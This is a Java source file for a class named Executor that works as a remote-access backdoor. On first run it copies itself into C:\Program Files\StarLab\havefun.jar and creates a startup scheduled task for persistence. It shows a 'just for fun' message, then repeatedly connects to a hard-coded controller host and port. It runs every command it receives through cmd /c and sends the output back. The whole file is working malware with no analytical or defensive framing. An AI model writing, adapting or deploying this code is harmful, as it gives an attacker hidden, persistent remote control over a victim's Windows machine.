package com.jeiel.util;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.Socket;

public class Executor {
	private static final String CONTROLLER_HOST_NAME = "hlsang-PC";
	private static int CONTROLLER_PORT = 25463;
	private static String dirPath = "C:\\Program Files\\StarLab\\";
	private static String targetFileName = "havefun.jar";
	
	private static Socket client = null;
	private static DataOutputStream dos = null;
	private static DataInputStream dis = null;
	
	public static void main(String[] args) throws Exception {
		// TODO Auto-generated method stub
		if(hide().equals("no_need")){
			Runtime.getRuntime().exec("cmd /c msg %username% Hello %username%, just for fun!\nForget about it.");
			establishConnection();
			if(client!=null){
				waitForCommand();
			}
			close();
		}else{
			Runtime.getRuntime().exec("cmd /c java -jar \""+dirPath+targetFileName+"\"");
		}
		System.out.println("Exit");
	}
	
	public static void establishConnection(){
		while(true){
			try {
				System.out.println("Establishing Connection...");
				client = new Socket(CONTROLLER_HOST_NAME, CONTROLLER_PORT);
				dis = new DataInputStream(client.getInputStream());
				dos = new DataOutputStream(client.getOutputStream());
				System.out.println("Connected");
				break;
			} catch (Exception e) {
				System.out.println(e.getLocalizedMessage());
				System.out.println("Retry in 10s...");
			}
			try {
				Thread.sleep(10*1000);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		
	}

	public static void waitForCommand(){
		while(true){
			try{
				System.out.println("Waiting for command...");
				String cmd = receiveCommand();
				if(cmd.equals("EXIT")){
					return;
				}else if(cmd.equals("RESET")){
					System.out.println("Resetting connection...");
					establishConnection();
					continue;
				}
				String result = getCMDReturnMsg(cmd);
				//System.out.println(result);
				sendExecuteResult(result);
			}catch(Exception e){
				e.printStackTrace();
			}
		}
	}

	public static String getCMDReturnMsg(String cmd){
		if(cmd==null||cmd.length()==0) return "";
		try{
			System.out.println("Executing: cmd /c " + cmd);
			Process p = Runtime.getRuntime().exec("cmd /c " + cmd);
			InputStream is = p.getInputStream();
			StringBuilder msg = new StringBuilder();
			byte[] b = new byte[1024];
			int len = 0;
			while((len=is.read(b))>0){
				msg.append(new String(b, 0, len,"GBK"));
			}
			//System.out.println(msg.toString());
			return msg.toString();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return "";
	}
	
	public static String receiveCommand(){
		try{
			String cmd = dis.readUTF();
			return cmd;
		}catch(Exception e){
			if(e.getLocalizedMessage().equals("Connection reset")||e.getLocalizedMessage().equals("Accept timed out")){
				System.out.println(e.getLocalizedMessage());
				return "RESET";
			}else{
				e.printStackTrace();
			}
		}
		return "";
	}
	
	public static void sendExecuteResult(String msg){
		if(msg==null)return;
		try{
			System.out.println("Sending back result...");
			dos.writeUTF(msg);
			dos.flush();
		}catch(Exception e){
			if(e.getLocalizedMessage().equals("Socket is closed")){
				System.out.println(e.getLocalizedMessage());
				establishConnection();
			}else{
				e.printStackTrace();
			}
		}
	}
	
	public static void close(){
		try {
			if(client!=null){
				client.close();
			}
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}
	
	public static String hide(){
		String sourceFileName = System.getProperty("java.class.path");
		File targetDir = new File(dirPath);
		File sourceFile = new File(sourceFileName);
		File targetFile = new File(dirPath, targetFileName);
		if(sourceFile.getAbsolutePath().startsWith(dirPath)){
			return "no_need";
		}
		if(!targetDir.exists()){
			targetDir.mkdirs();
		}
		try(FileInputStream fis = new FileInputStream(sourceFile);
				FileOutputStream fos = new FileOutputStream(targetFile)){
			int len = 0;
			byte[] b = new byte[10240];
			while((len=fis.read(b))>0){
				fos.write(b, 0, len);
			}
			String schtasksStr = "schtasks /create /tn \"AutoExecutor\" /tr  \"C:\\Program Files\\StarLab\\havefun.jar\" /sc onstart";
			Runtime.getRuntime().exec(schtasksStr);
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		return "";
	}
	
}
